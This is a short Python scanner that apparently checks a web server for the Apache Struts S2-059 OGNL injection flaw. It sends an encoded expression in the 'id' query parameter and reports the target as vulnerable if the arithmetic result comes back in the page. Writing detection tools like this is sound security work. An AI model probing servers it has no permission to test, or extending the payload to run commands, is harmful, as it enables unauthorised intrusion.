try:
    import requests,sys,os,logging
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        if '://' not in url:
            url = 'http://' + url+":"+port
        self.url = url.strip('/')


    def Test(self):
        try:
            req = requests.get(self.url + '?id=%25%7B256*-256%7D',timeout=3)
        except:
            os._exit(4)
        #print req.text
        if ('-65536' in req.text):
            logging.info('[+] Found S2-059 in ' + self.url)
            os._exit(1)
        else:
            logging.info( '[-] S2-059 Not Found in ' + self.url)
            os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

